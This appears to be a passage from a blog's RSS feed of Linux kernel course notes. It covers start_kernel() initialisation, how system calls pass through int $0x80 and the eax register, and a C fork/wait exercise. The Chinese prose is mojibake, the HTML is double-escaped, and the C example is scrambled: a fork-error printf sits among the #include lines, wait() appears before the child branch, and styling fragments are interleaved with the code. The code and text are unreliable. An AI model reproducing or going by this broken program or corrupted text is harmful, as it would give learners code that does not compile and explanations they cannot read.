//åå§åè½¯ä»¶ä¸­æ­ï¼è½¯ä»¶ä¸­æ­ä¸ç¡¬ä»¶ä¸­æ­åºå«å°±æ¯ä¸­æ­åçæ¶ï¼è½¯ä»¶ä¸­æ­æ¯ä½¿ç¨çº¿ç¨æ¥çè§ä¸­æ­ä¿¡å·ï¼èç¡¬ä»¶ä¸­æ­æ¯ä½¿ç¨CPUç¡¬ä»¶æ¥çè§ä¸­æ­ã
time_init(); //åå§åç³»ç»æ¶éãå¼å¯ä¸ä¸ªç¡¬ä»¶å®æ¶å¨ï¼å¼å§äº§çç³»ç»æ¶éå°±æ¯system_timerçåå§å,arch/arm/mach-msm/board-*.c
console_init();
if (panic_later)
panic(panic_later, panic_param);
profile_init();
local_irq_enable();
#ifdef CONFIG_BLK_DEV_INITRD
if (initrd_start &amp;amp;&amp;amp; !initrd_below_start_ok &amp;amp;&amp;amp;
initrd_start &amp;lt; min_low_pfn &amp;lt;&amp;lt; PAGE_SHIFT) {
printk(KERN_CRIT &amp;quot;initrd overwritten (0x%08lx &amp;lt; 0x%08lx) - &amp;quot;
&amp;quot;disabling it.\n&amp;quot;,initrd_start,min_low_pfn &amp;lt;&amp;lt; PAGE_SHIFT);
initrd_start = 0;
}
#endif
vfs_caches_init_early(); //åæèææä»¶ç³»ç»(vfs)çç¼å­åå§å
mem_init(); //åå§ååå­å¹¶è®¡ç®å¯ç¨åå­å¤§å°;æ è®°åªäºåå­å¯ä»¥ä½¿ç¨ï¼å¹¶ä¸åè¯ç³»ç»æå¤å°åå­å¯ä»¥ä½¿ç¨ï¼å½ç¶æ¯é¤äºåæ ¸ä½¿ç¨çåå­ä»¥å¤
kmem_cache_init(); // åå§åSLABç¼å­åéå¨
setup_per_cpu_pageset();
numa_policy_init();
if (late_time_init)
late_time_init();
calibrate_delay();
pidmap_init(); //è¿ç¨å·ä½å¾åå§åï¼ä¸è¬ç¨ä¸ä¸ªpageæ¥æç¤ºææçè¿ç¨PIDå ç¨æåµ
pgtable_cache_init();
prio_tree_init(); //åå§ååæ ¸åºäºradixæ çä¼åçº§æç´¢æ (PST)ï¼åå§åç»æä½
anon_vma_init(); //åå§åååæ å°çå¿ååå­ï¼æä¾ååæ¥æ¾åå­çç»ææéä½ç½®ï¼å¿«éå°åæ¶åå­ã
#ifdef CONFIG_X86
if (efi_enabled)
efi_enter_virtual_mode();
#endif
fork_init(num_physpages); //åå§åkernelçfork()ç¯å¢ãLinuxä¸åºç¨ç¨åºæ§è¡æ¯é ç³»ç»è°ç¨fork()å®æï¼fork_initæå®æçå·¥ä½å°±æ¯ç¡®å®å¯ä»¥fork()ççº¿ç¨çæ°éï¼ç¶åæ¯åå§åinit_taskè¿ç¨
proc_caches_init(); //è¿ç¨ç¼å­åå§åï¼ä¸ºè¿ç¨åå§ååå»ºæºå¶æéçå¶ä»æ°æ®ç»æç³è¯·ç©ºé´
buffer_init(); //åå§åæä»¶ç³»ç»çç¼å²åºï¼å¹¶è®¡ç®æå¤§å¯ä»¥ä½¿ç¨çæä»¶ç¼å­ã
unnamed_dev_init(); //åå§åä¸ä¸ªèææä»¶ç³»ç»ä½¿ç¨çåæä»¶
key_init(); //æ²¡æé®çåä¸ºç©ºï¼å¦ææé®çï¼åä¸ºé®çåéä¸ä¸ªé«éç¼å­
security_init();
vfs_caches_init(num_physpages); //åå§åèææä»¶ç³»ç»
radix_tree_init();
signals_init(); //åå§ååæ ¸ä¿¡å·éåâ¦.
page_writeback_init(); //é¡µé¢åæºå¶åå§å
#ifdef CONFIG_PROC_FS
proc_root_init();
//åå§åç³»ç»è¿ç¨æä»¶ç³»ç»ï¼ä¸»è¦æä¾åæ ¸ä¸ç¨æ·è¿è¡äº¤äºçå¹³å°ï¼æ¹ä¾¿ç¨æ·å®æ¶æ¥çè¿ç¨çä¿¡æ¯ã
#endif
cpuset_init(); //åå§åCPUSETï¼CPUSETä¸»è¦ä¸ºæ§å¶ç»æä¾CPUååå­èç¹çç®¡ççç»æã
check_bugs(); //æ£æ¥CPUéç½®ãFPUç­æ¯å¦éæ³ä½¿ç¨ä¸å·å¤çåè½ï¼æ£æ¥CPU BUGï¼è½¯ä»¶è§é¿BUG
acpi_early_init(); /* before LAPIC and SMP init */
rest_init(); //æåå®éè¿å¥reset_init()å½æ°ï¼åæ¬ææå©ä¸çç¡¬ä»¶é©±å¨ï¼çº¿ç¨åå§åç­è¿ç¨â¦è¿ä¹æç»å®æstart_kernelçå¯å¨è¿ç¨ã
}&amp;lt;/span&amp;gt;
&lt;/code>&lt;/pre>
&lt;p>æ¥ä¸æ¥åæinitè¿ç¨çåå»ºåæ§è¡ï¼
&lt;img src="http://www.guozet.me/images/in-post/2015-06-18-Linux-Kernel-analysis-Start-Kernel-Function/2018-09-19-01-21-04.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-18-Linux-Kernel-analysis-Start-Kernel-Function/2018-09-19-01-21-19.png" alt="">&lt;/p>
&lt;p>&lt;code>start_kernel() -&amp;gt; rest_init() -&amp;gt; kernel_init() -&amp;gt; å¯å¨initè¿ç¨;&lt;/code>&lt;/p>
&lt;p>rest_initå½æ°ä¸­åå»ºçä¸ä¸ªåæ ¸çº¿ç¨kernel_initï¼è°ç¨è¯¥åæ ¸çº¿ç¨ä¹åï¼è¯¥çº¿ç¨è¦å®æçä»»å¡æ¯å¯å¨initè¿ç¨ï¼ä¹å°±æ¯æä»¬æè°çï¼å·è¿ç¨ï¼æ¯ç³»ç»å¯å¨åçç¬¬ä¸ä¸ªè¿ç¨ãå¤§è´å¯å¦ä¸è¡¨ç¤ºï¼
0å·è¿ç¨(rest_init)-&amp;gt;1å·åæ ¸è¿ç¨ï¼kernel_initï¼-&amp;gt;1å·ç¨æ·è¿ç¨ï¼initè¿ç¨ï¼
åæ¶ï¼å·è¿ç¨rest_initä¸­æåä¼è°ç¨ä¸ä¸ªidleçè¿ç¨ï¼idleè¿ç¨æ¯å¨ç³»ç»ä¸­æ²¡æä»»ä½ä»»å¡æ§è¡çæ¶åï¼è¯¥ä»»å¡å¼å§å·¥ä½ã&lt;/p>
&lt;h1 id="å®éªåæ ¸è°è¯">å®éªï¼åæ ¸è°è¯&lt;/h1>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-18-Linux-Kernel-analysis-Start-Kernel-Function/2018-09-19-01-22-15.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-18-Linux-Kernel-analysis-Start-Kernel-Function/2018-09-19-01-22-25.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-18-Linux-Kernel-analysis-Start-Kernel-Function/2018-09-19-01-22-34.png" alt="">&lt;/p></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨4_Linuxç³»ç»è°ç¨</title><link>http://www.guozet.me/post/Linux-kernel-analysis-system-call/</link><pubDate>Sun, 01 Mar 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-kernel-analysis-system-call/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬åå¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã&lt;br>
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;p>ä¸»è¦åå®¹ï¼&lt;/p>
&lt;ol>
&lt;li>Linuxç³»ç»è°ç¨çåç&lt;/li>
&lt;li>ç³»ç»è°ç¨çå®ç°ä¸æä¹&lt;/li>
&lt;li>APIåç³»ç»è°ç¨&lt;/li>
&lt;li>ç³»ç»è°ç¨ç¨åºåæå¡ä¾ç¨&lt;/li>
&lt;li>å®éªï¼ä½¿ç¨Cè¯­è¨åæ±ç¼åå«è¿è¡ç³»ç»è°ç¨&lt;/li>
&lt;/ol>
&lt;h1 id="linuxç³»ç»è°ç¨çåç">Linuxç³»ç»è°ç¨çåç&lt;/h1>
&lt;p>ç³»ç»è°ç¨ï¼é¡¾åæä¹ï¼è¯´çæ¯&lt;code>æä½ç³»ç»æä¾ç»ç¨æ·ç¨åºè°ç¨çä¸ç»âç¹æ®âæ¥å£ãç¨æ·ç¨åºå¯ä»¥éè¿è¿ç»âç¹æ®âæ¥å£æ¥è·å¾æä½ç³»ç»åæ ¸æä¾çæå¡&lt;/code>ï¼æ¯å¦ç¨æ·å¯ä»¥éè¿æä»¶ç³»ç»ç¸å³çè°ç¨è¯·æ±ç³»ç»æå¼æä»¶ãå³é­æä»¶æè¯»åæä»¶ï¼å¯ä»¥éè¿æ¶éç¸å³çç³»ç»è°ç¨è·å¾ç³»ç»æ¶é´æè®¾ç½®å®æ¶å¨ç­ã&lt;/p>
&lt;p>ä»é»è¾ä¸æ¥è¯´ï¼ç³»ç»è°ç¨å¯è¢«çææ¯ä¸ä¸ªåæ ¸ä¸ç¨æ·ç©ºé´ç¨åºäº¤äºçæ¥å£ââå®å¥½æ¯ä¸ä¸ªä¸­é´äººï¼æç¨æ·è¿ç¨çè¯·æ±ä¼ è¾¾ç»åæ ¸ï¼å¾åæ ¸æè¯·æ±å¤çå®æ¯ååå°å¤çç»æéåç»ç¨æ·ç©ºé´ã&lt;/p>
&lt;p>ç³»ç»æå¡ä¹æä»¥éè¦éè¿ç³»ç»è°ç¨æ¥æä¾ç»ç¨æ·ç©ºé´çæ ¹æ¬åå æ¯ä¸ºäºå¯¹ç³»ç»è¿è¡âä¿æ¤âï¼å ä¸ºæä»¬ç¥éLinuxçè¿è¡ç©ºé´åä¸ºåæ ¸ç©ºé´ä¸ç¨æ·ç©ºé´ï¼å®ä»¬åèªè¿è¡å¨ä¸åççº§å«ä¸­ï¼é»è¾ä¸ç¸äºéç¦»ã&lt;code>æä»¥ç¨æ·è¿ç¨å¨éå¸¸æåµä¸ä¸åè®¸è®¿é®åæ ¸æ°æ®ï¼ä¹æ æ³ä½¿ç¨åæ ¸å½æ°ï¼å®ä»¬åªè½å¨ç¨æ·ç©ºé´æä½ç¨æ·æ°æ®ï¼è°ç¨ç¨æ·ç©ºé´å½æ°&lt;/code>ãæ¯å¦æä»¬çæçâhello worldâç¨åºï¼æ§è¡æ¶ï¼å°±æ¯æ åçç¨æ·ç©ºé´è¿ç¨ï¼å®ä½¿ç¨çæå°å½æ°printfå°±å±äºç¨æ·ç©ºé´å½æ°ï¼æå°çå­ç¬¦âhello wordâå­ç¬¦ä¸²ä¹å±äºç¨æ·ç©ºé´æ°æ®ã&lt;/p>
&lt;p>ä½æ¯å¾å¤æåµä¸ï¼ç¨æ·è¿ç¨éè¦è·å¾ç³»ç»æå¡ï¼è°ç¨ç³»ç»ç¨åºï¼ï¼è¿æ¶å°±å¿é¡»å©ç¨ç³»ç»æä¾ç»ç¨æ·çâç¹æ®æ¥å£âââç³»ç»è°ç¨äºï¼å®çç¹æ®æ§ä¸»è¦å¨äºè§å®äºç¨æ·è¿ç¨è¿å¥åæ ¸çå·ä½ä½ç½®ï¼æ¢å¥è¯è¯´ï¼ç¨æ·è®¿é®åæ ¸çè·¯å¾æ¯äºåè§å®å¥½çï¼åªè½ä»è§å®ä½ç½®è¿å¥åæ ¸ï¼èä¸åè®¸èæè·³å¥åæ ¸ãæäºè¿æ ·çé·å¥åæ ¸çç»ä¸è®¿é®è·¯å¾éå¶æè½ä¿è¯åæ ¸å®å¨æ èã&lt;code>æä»¬å¯ä»¥å½¢è±¡å°æè¿°è¿ç§æºå¶ï¼ä½ä¸ºä¸ä¸ªæ¸¸å®¢ï¼ä½ å¯ä»¥ä¹°ç¥¨è¦æ±è¿å¥éçå¨ç©å­ï¼ä½ä½ å¿é¡»èèå®å®å°åå¨è§åè½¦ä¸ï¼æç§è§å®çè·¯çº¿è§åæ¸¸è§ãå½ç¶ï¼ä¸åä¸è½¦ï¼å ä¸ºé£æ ·å¤ªå±é©ï¼ä¸æ¯è®©ä½ ä¸¢æå°å½ï¼å°±æ¯è®©ä½ ååäºéçå¨ç©ã&lt;/code>&lt;/p>
&lt;p>è¯¥æ®µå¼ç¨èªåå®¢ï¼
&lt;a href="http://http//blog.csdn.net/orange_os/article/details/7485069" target="_blank" rel="noopener">Linuxç³»ç»è°ç¨&lt;/a>&lt;/p>
&lt;h1 id="ç³»ç»è°ç¨çå®ç°åæä¹">ç³»ç»è°ç¨çå®ç°åæä¹&lt;/h1>
&lt;p>Linuxç³»ç»è°ç¨æ¯éè¿è½¯ä¸­æ­æ¥å®ç°çï¼è½¯ä¸­æ­æ¯æç¼ç¨äººåå¨è½¯ä»¶ä¸­è¿è¡è§¦åçï¼æ³¨æåºå«ä¸ç¡¬ä»¶ä¸­æ­ï¼ï¼å¨ä»£ç ä¸­çä½ç°æ¯éè¿int $0x80æ±ç¼æä»¤æ¥è§¦åç¼ç¨å¼å¸¸ï¼&lt;/p>
&lt;p>&lt;strong>é£ä¸ºä»ä¹è¦å¼ä¸ä¸ªå¼å¸¸æºå¶å¢ï¼&lt;/strong> å ä¸ºå½ç¨æ·æçè¿ç¨è°ç¨ä¸ä¸ªç³»ç»è°ç¨æ¶ï¼CPUä¾¿è¢«åæ¢å°åæ ¸ææ§è¡åæ ¸å½æ°ï¼èæä»¬å¨i386ä½ç³»ç»æé¨åå·²ç»è®²è¿°è¿äºè¿å¥åæ ¸ââè¿å¥é«ç¹æçº§å«ââå¿é¡»ç»è¿ç³»ç»çé¨æºå¶ï¼è¿éçå¼å¸¸å®éä¸å°±æ¯éè¿ç³»ç»é¨é·å¥åæ ¸ã&lt;/p>
&lt;p>è¯¦ç»å°è§£éä¸ä¸è¿ä¸ªè¿ç¨ãint $0x80æä»¤çç®çæ¯äº§çä¸ä¸ªç¼å·ä¸º0x80çç¼ç¨å¼å¸¸ï¼è¿ä¸ªç¼ç¨å¼å¸¸å¯¹åºçæ¯ä¸­æ­æè¿°ç¬¦è¡¨IDTä¸­çç¬¬128é¡¹ââä¹å°±æ¯å¯¹åºçç³»ç»é¨æè¿°ç¬¦ãé¨æè¿°ç¬¦ä¸­å«æä¸ä¸ªé¢è®¾çåæ ¸ç©ºé´å°åï¼å®æåäºç³»ç»è°ç¨å¤çç¨åºï¼system_call()ï¼å«åç³»ç»è°ç¨æå¡ç¨åºæ··æ·,è¿ä¸ªç¨åºå¨entry.Sæä»¶ä¸­ç¨æ±ç¼è¯­è¨ç¼åï¼ã&lt;/p>
&lt;p>å¾æ¾ç¶ï¼ææçç³»ç»è°ç¨é½ä¼ç»ä¸å°è½¬å°è¿ä¸ªå°åï¼ä½&lt;code>Linuxä¸å±æ256ç³»ç»è°ç¨é½ä»è¿éè¿å¥åæ ¸ååè¯¥å¦ä½æ´¾åå°å®ä»¬å°åèªçæå¡ç¨åºå»å¢ï¼&lt;/code>&lt;/p>
&lt;p>è§£å³è¿ä¸ªé®é¢çæ¹æ³éå¸¸ç®åï¼é¦åLinuxä¸ºæ¯ä¸ªç³»ç»è°ç¨é½è¿è¡äºç¼å·ï¼0âNR_syscallï¼ï¼åæ¶å¨åæ ¸ä¸­ä¿å­äºä¸å¼ ç³»ç»è°ç¨è¡¨ï¼è¯¥è¡¨ä¸­ä¿å­äºç³»ç»è°ç¨ç¼å·åå¶å¯¹åºçæå¡ä¾ç¨ï¼å æ­¤å¨ç³»ç»è°å¥éè¿ç³»ç»é¨é·å¥åæ ¸åï¼éè¦æç³»ç»è°ç¨å·ä¸å¹¶ä¼ å¥åæ ¸ï¼å¨x86ä¸ï¼è¿ä¸ªä¼ éå¨ä½æ¯éè¿å¨æ§è¡int0x80åæè°ç¨å·è£å¥eaxå¯å­å¨å®ç°çãè¿æ ·ç³»ç»è°ç¨å¤çç¨åºä¸æ¦è¿è¡ï¼å°±å¯ä»¥ä»eaxä¸­å¾å°æ°æ®ï¼ç¶ååå»ç³»ç»è°ç¨è¡¨ä¸­å¯»æ¾ç¸åºæå¡ä¾ç¨äºã&lt;/p>
&lt;p>&lt;strong>é£ä¹ï¼è°ç¨æ¶åçåæ°æ¯å¦ä½ä¼ éçå¢ï¼&lt;/strong>&lt;/p>
&lt;p>ä¼ éçåæ°ä¸»è¦æï¼&lt;/p>
&lt;ul>
&lt;li>å®éçå¼ï¼&lt;/li>
&lt;li>ç¨æ·æè¿ç¨å°åç©ºé´çåéçå°åï¼&lt;/li>
&lt;li>çè³æ¯åå«æåç¨æ·æå½æ°çæéçæ°æ®ç»æçå°åï¼&lt;/li>
&lt;/ul>
&lt;p>å¯å­å¨ä¼ éåæ°å·æå¦ä¸éå¶ï¼&lt;/p>
&lt;ul>
&lt;li>æ¯ä¸ªåæ°çé¿åº¦ä¸è½è¶è¿å¯å­å¨çé¿åº¦ï¼å³32ä½&lt;/li>
&lt;li>å¨ç³»ç»è°ç¨å·ï¼eaxï¼ä¹å¤ï¼åæ°çä¸ªæ°ä¸è½è¶è¿6ä¸ªï¼ebxï¼ecxï¼edxï¼esiï¼ediï¼ebpï¼&lt;/li>
&lt;/ul>
&lt;p>è¶è¿6ä¸ªæä¹åï¼è¶è¿ï¼ä¸ªçè¯ï¼å¯å°å¶æ¾å°åå­ä¸­ï¼æåå­å°åä¼ éè¿å»å³å¯ï¼
ç³»ç»è°ç¨è¿ç¨å¦ä¸æç¤ºï¼
&lt;img src="http://www.guozet.me/images/in-post/2015-06-19-Linux-kernel-analysis-system-call/2018-09-19-01-34-29.png" alt="">&lt;/p>
&lt;p>&lt;strong>æ»ç»ï¼ç³»ç»è°ç¨ï¼ç®èè¨ä¹ï¼å°±æ¯è½¯ä»¶éè¿è°ç¨APIï¼ç±APIè°ç¨int $0x80 è§¦åè½¯ä»¶ä¸­æ­ï¼ç¶åéè¿ä¸äºå¯å­å¨å°åæ°ä¼ å¥ï¼å®ç°ä¸äºç¡¬ä»¶çæä½ã&lt;/strong>&lt;/p>
&lt;p>é£è®¾ç½®ç³»ç»è°ç¨çæä¹ä½å¨å¢ï¼&lt;/p>
&lt;p>æä½ç³»ç»ä¸ºç¨æ·æè¿ç¨ä¸ç¡¬ä»¶è®¾å¤è¿è¡äº¤äºæä¾äºä¸ç»æ¥å£ââç³»ç»è°ç¨&lt;/p>
&lt;ul>
&lt;li>æç¨æ·ä»åºå±çç¡¬ä»¶ç¼ç¨ä¸­è§£æ¾åºæ¥&lt;/li>
&lt;li>æå¤§çæé«äºç³»ç»çå®å¨æ§&lt;/li>
&lt;li>ä½¿ç¨æ·ç¨åºå·æå¯ç§»æ¤æ§&lt;/li>
&lt;/ul>
&lt;h1 id="apiç³»ç»è°ç¨ç³»ç»å½ä»¤åæ ¸å½æ°">APIï¼ç³»ç»è°ç¨ï¼ç³»ç»å½ä»¤ï¼åæ ¸å½æ°&lt;/h1>
&lt;p>åºç¨ç¼ç¨æ¥å£(application program interface, API)æ¯ä¸ä¸ªå½æ°å®ä¹ï¼è¯´æäºå¦ä½è·å¾ä¸ä¸ªç»å®çæå¡ï¼æ¯å¦read( )ãmalloc( )ãfree( )ãabs( )ç­ãå®æå¯è½åç³»ç»è°ç¨å½¢å¼ä¸ä¸è´ï¼æ¯å¦read()æ¥å£å°±åreadç³»ç»è°ç¨å¯¹åºï¼ä½è¿ç§å¯¹åºå¹¶éä¸ä¸å¯¹åºï¼&lt;code>å¾å¾ä¼åºç°å ç§ä¸åçAPIåé¨ç¨å°åä¸ä¸ªç³»ç»è°ç¨ï¼æ¯å¦malloc( )ãfree( )åé¨å©ç¨brk( )ç³»ç»è°ç¨æ¥æ©å¤§æç¼©å°è¿ç¨çå &lt;/code>ï¼æä¸ä¸ªAPIå©ç¨äºå¥½å ä¸ªç³»ç»è°ç¨ç»åå®ææå¡ãæ´æäºAPIçè³ä¸éè¦ä»»ä½ç³»ç»è°ç¨ââå ä¸ºå®å¹¶ä¸æ¯å¿éè¦ä½¿ç¨åæ ¸æå¡ï¼å¦è®¡ç®æ´æ°ç»å¯¹å¼çabsï¼ï¼æ¥å£&lt;/p>
&lt;p>ç³»ç»è°ç¨å¹¶éç´æ¥åç¨åºåæç³»ç»ç®¡çåæäº¤éï¼å®ä»ä»æ¯ä¸ä¸ªéè¿è½¯ä¸­æ­æºå¶ï¼æä»¬åé¢è®²è¿°ï¼ååæ ¸æäº¤è¯·æ±ï¼è·ååæ ¸æå¡çæ¥å£ã&lt;/p>
&lt;p>ç³»ç»å½ä»¤ï¼å°±æ¯å¯ä»¥æ§è¡çä¸äºç¨åºï¼å©ç¨äºç°æçä¸äºAPIæ¥å®ç°ç¹å®çå¸¸ç¨åè½ã&lt;/p>
&lt;p>åæ ¸å½æ°ï¼å¬çå¾é«å¤§ä¸ï¼å¶å®å®ä»¬åæ®éå½æ°å¾åï¼ä½ä¸å¯¹ç¨æ·å±ç°ï¼ç³»ç»èªå·±ä½¿ç¨çä¸äºå½æ°ï¼å¨åæ ¸å®ç°ï¼å æ­¤è¦æ»¡è¶³ä¸äºåæ ¸ç¼ç¨çè¦æ±ãèç³»ç»è°ç¨æ¯ä¸å±ç¨æ·è¿å¥åæ ¸çæ¥å£ï¼å®æ¬èº«å¹¶éåæ ¸å½æ°ï¼è¿å¥åæ ¸åï¼ä¸åçç³»ç»è°ç¨ä¼æ¾å°å¯¹åºå°åèªçåæ ¸å½æ°ââæ¢ä¸ªä¸ä¸è¯´æ³å°±å«ï¼&lt;code>ç³»ç»è°ç¨æå¡ä¾ç¨ãå®éä¸éå¯¹è¯·æ±æä¾æå¡çæ¯åæ ¸å½æ°èéè°ç¨æ¥å£ã&lt;/code>&lt;/p>
&lt;h1 id="ç³»ç»è°ç¨ç¨åºåæå¡ä¾ç¨">ç³»ç»è°ç¨ç¨åºåæå¡ä¾ç¨&lt;/h1>
&lt;p>ä¸é¢æå°Linuxåªåè®¸ç³»ç»è°ç¨æ¥å£ä½¿ç¨128è¿ä¸ä¸ªè½¯ä¸­æ­åéï¼è¿ä¹å°±æå³çææçç³»ç»è°ç¨æ¥å£å¿é¡»å±äº«è¿ä¸ä¸ªä¸­æ­ééï¼å¹¶å¨åä¸ä¸ªä¸­æ­æå¡ä¾ç¨ä¸­ï¼è¿éçä¸­æ­æå¡ä¾ç¨å°±æ¯å¯¹åºäºä¸­æ­å·ä¸º128çä¸­æ­æå¡ä¾ç¨ï¼éè¿æ¥ä¸­æ­åéè¡¨å¾å°ï¼è°ç¨ä¸åçåæ ¸æå¡ä¾ç¨ï¼æä»¥ï¼ç³»ç»è°ç¨æ¥å£é¤äºè¦å¼åâint ï¼ Ox80âè½¯ä¸­æ­ä¹å¤ï¼ä¸ºäºè¿äººåæ ¸åè½è°ç¨ä¸åçåæ ¸æå¡ä¾ç¨ï¼è¿è¦æä¾è¯å«åæ ¸æå¡ä¾ç¨çåæ°ï¼è¿ä¸ªåæ°å«åâç³»ç»è°ç¨å·âãä¹å°±æ¯è¯´ï¼ææå¯ä¸ºè¿ç¨æä¾æå¡çåæ ¸æå¡ä¾ç¨é½åºå·æä¸ä¸ªå¯ä¸çç³»ç»è°ç¨å·ãå½ç¶ï¼ç³»ç»è°ç¨æ¥å£è¿åºä¸ºåæ ¸æå¡ä¾ç¨ååå¿è¦çåæ°ã&lt;/p>
&lt;p>é£ä¹ï¼è¿éï¼æå°±æªä¸ä¸ªç³»ç»è°ç¨è¡¨çå¾çç»å¤§å®¶ççï¼&lt;br>
&lt;img src="http://www.guozet.me/images/in-post/2015-06-19-Linux-kernel-analysis-system-call/2018-09-19-01-35-22.png" alt="">&lt;/p>
&lt;p>å¨å¾ä¸­æä»¬å¯ä»¥çå°ï¼æä»¬çç³»ç»è°ç¨è¡¨æ ¼ä¸­çç¬¬ä¸ä¸ªè°ç¨æ¯sys_restart_syscall,ä¹å°±æ¯éå¯äºï¼ç³»ç»ä¸ºæ¯ä¸ä¸ªç³»ç»è°ç¨é½å®ä¹äºä¸ä¸ªå¯ä¸çç¼å·ï¼åæ¶å¨åæ ¸ä¸­ä¿å­äºä¸å¼ ç³»ç»è°ç¨è¡¨ï¼è¯¥è¡¨ä¸­ä¿å­äºç³»ç»è°ç¨ç¼å·åå¶å¯¹åºçæå¡ä¾ç¨å°åï¼ç¬¬å¢nä¸ªè¡¨é¡¹åå«äºç³»ç»è°ç¨å·ä¸ºnçæå¡ä¾ç¨çå°åï¼&lt;/p>
&lt;p>ææç³»ç»è°ç¨é·å¥åæ ¸åï¼éè¦å°ç³»ç»è°ç¨å·ä¸èµ·ä¼ å¥åæ ¸ï¼èè¯¥æ å·å®éä¸å°±æ¯ç³»ç»è°ç¨è¡¨çä¸æ ï¼å¨i386ä¸ï¼è¿ä¸ªä¼ éå·¥ä½æ¯éè¿å¨æ§è¡int $0x80åæè°ç¨å·è£å¥eaxå¯å­å¨æ¥å®ç°çï¼è¿æ ·ç³»ç»è°ç¨å¤çç¨åºä¸æ¦è¿è¡èµ·æ¥ï¼å°±å¯ä»¥ä»eaxä¸­å¾å°ç³»ç»è°ç¨å·ï¼ç¶ååå°ç³»ç»è°ç¨è¡¨ä¸­å»å¯»æ¾ç¸åºçæå¡ä¾ç¨ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-19-Linux-kernel-analysis-system-call/2018-09-19-01-35-35.png" alt="">&lt;/p>
&lt;p>&lt;strong>æ´çç³»ç»è°ç¨çè¿ç¨ï¼&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>åºç¨ç¨åºè°ç¨å°è£å¥½çAPI&lt;/li>
&lt;li>è¦ä¿æ¤ç¨æ·æçç°åºï¼å³æå¤çå¨çç¨æ·æè¿è¡ç¯å¢ä¿æ¤å°è¿ç¨çåæ ¸å æ ã&lt;/li>
&lt;li>APIå°å¯¹åºçç³»ç»è°ç¨å·å­å¥eaxï¼å¦æéè¦ä¼ åï¼è¿è¦å¨å¶ä»å¯å­å¨ä¸­ä¼ å¥ç¸å³åæ°ï¼ç¶åè°ç¨int $0x80è§¦åä¸­æ­è¿å¥åæ ¸ä¸­çä¸­æ­å¤çå½æ°&lt;/li>
&lt;li>åæ ¸ä¸­çä¸­æ­å¤çç¨åºæ ¹æ®ç³»ç»è°ç¨å·è°ç¨å¯¹åºçç³»ç»è°ç¨&lt;/li>
&lt;li>ç³»ç»å®æç¸åºåè½ï¼å°è¿åå¼å­å¥eaxï¼è¿åå°ä¸­æ­å¤çå½æ°ï¼&lt;/li>
&lt;li>ä¸­æ­å¤çå½æ°è¿åå°APIä¸­;//å¨è¿åçéä¸­ï¼æè¿ç¨è°åº¦ï¼å¦ææä¼åçº§æ´é«çè¿ç¨ï¼ä¼è°åº¦&lt;/li>
&lt;li>APIå°eaxï¼å³ç³»ç»è°ç¨çè¿åå¼è¿åç»åºç¨ç¨åºã&lt;/li>
&lt;/ol>
&lt;h1 id="å®éªä½¿ç¨cè¯­è¨åæ±ç¼åå«è¿è¡ç³»ç»è°ç¨">å®éªï¼ä½¿ç¨Cè¯­è¨åæ±ç¼åå«è¿è¡ç³»ç»è°ç¨&lt;/h1>
&lt;p>å¨è¿éï¼ä½¿ç¨çç³»ç»è°ç¨ä¸­çexit()æ¥è¿è¡ç³»ç»è°ç¨å®è·µï¼ä¸é¢æ¯Cè¯­è¨ç¨åºï¼ä¸»è¦çåè½æ¯ç¶è¿ç¨fork()ä¸ä¸ªå­è¿ç¨ï¼ç¶åå­è¿ç¨æ²ç¡ï¼ç§éååµæ­»ï¼ç¶è¿ç¨ç­å¾å­è¿ç¨éåºä¹ååæ¶å­è¿ç¨ã&lt;/p>
&lt;pre>&lt;code class="language-c">&amp;lt;div style=&amp;quot;text-align: justify;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif;&amp;quot;&amp;gt;/*************************************************************************&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt; &amp;gt; File Name: Callexit.c
&amp;gt; Author: GuoZe Tang
&amp;gt; Mail: 269831714@qq.com
&amp;lt;div style=&amp;quot;text-align: justify;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif;&amp;quot;&amp;gt; ************************************************************************/&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt; &amp;gt; Created Time: Sun 29 Mar 2015 01:08:06 PM CST
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;time.h&amp;gt;
#include&amp;lt;sys/types.h&amp;gt;
&amp;lt;div style=&amp;quot;text-align: justify;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif;&amp;quot;&amp;gt; printf(&amp;quot;Fork error!\n&amp;quot;);&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;#include&amp;lt;unistd.h&amp;gt;
int main(int argc,char *argvs)
{
pid_t pc,pr;
int t;
pc =fork();
if(pc &amp;lt; 0)
&amp;lt;div style=&amp;quot;text-align: justify;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif;&amp;quot;&amp;gt; pr=wait(NULL);&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt; else if(pc == 0){
printf(&amp;quot;This is child process with pid of %d\n&amp;quot;,getpid());
sleep(5);
}
else{
&amp;lt;div style=&amp;quot;text-align: justify;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif;&amp;quot;&amp;gt;}&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt; printf(&amp;quot;I catched a child process with pid of %d\n&amp;quot;,pr);
}
